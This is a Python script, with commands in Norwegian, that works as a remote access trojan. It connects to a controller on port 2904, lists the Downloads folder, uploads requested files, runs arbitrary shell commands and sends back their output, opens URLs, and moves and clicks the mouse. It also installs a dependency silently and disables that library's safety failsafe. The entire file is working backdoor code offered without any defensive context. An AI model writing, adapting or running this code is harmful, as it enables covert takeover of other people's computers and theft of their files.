import socket
import glob
import os
import sys
import time
import webbrowser

g = True
l = True
try:
    import pyautogui
    pyautogui.FAILSAFE = False
except ModuleNotFoundError:
    os.popen('pip install pyautogui --user')
    import pyautogui
    pyautogui.FAILSAFE = False
while l:
    g = True
    while g:
        try:
            s = socket.socket()
            port = 2904
            g = False
            host = socket.gethostbyname(socket.gethostname())#'10.71.169.85'#min ip
            s.connect((host, port))
            time.sleep(5)
        except:
            g = True
            time.sleep(5)
             
        while True:
            massage = s.recv(1024).decode()
            print(massage)
            if massage == 'se filer':
                cum = os.popen('dir downloads').readlines()

                for line in cum:
                    if 'Directory' in line:
                        cum = line
                      
                cum2 = ''
                count = 0

                for i in cum:
                    if i == '\\':
                        count += 1
                    if i == '\\':
                        continue
                    if count == 2:
                        cum2 += i

                gum = glob.glob(f'C:/Users/{cum2}/downloads/*')
                gum2 = ''
                for line in gum:
                    gum2 += line
                    gum2 += '\n'
                
                s.send(gum2.encode())
            if 'last_ned' in massage:
                massage = massage.replace('last_ned', '')
                with open(massage, 'rb') as f:
                    file_data = f.read(100000000)
                    s.send(file_data)
                
            if massage == 'slutt':
                l = False
                break
                    
            if 'command=' in massage.lower():
                massage = massage.replace('COMMAND=', '')
                massage = massage.replace('command=', '')
                massage = massage.lstrip()
                massage2 = os.popen(massage).readlines()
                if massage2 == []:
                    s.send('du sendte noe feil'.encode())
                else:
                    massage = ''
                    for line in massage2:
                        massage += line
                            
                    s.send(massage.encode())
            if massage == 'open':
                massage2 = s.recv(1024).decode()
                webbrowser.open(massage2)
                s.send(f'ÅPNET OPP {massage2}!'.encode())
            if massage == 'click':
                s.send('True'.encode())
                while True:
                    x = s.recv(1024).decode()
                    if x == 'stop':
                       break
                    s.send(x.encode())
                    if 'c' in x:
                        pyautogui.click()
                        continue
                    x = x.split(', ')
                    pyautogui.moveTo(int(x[0]), int(x[1]))

        
sys.exit()
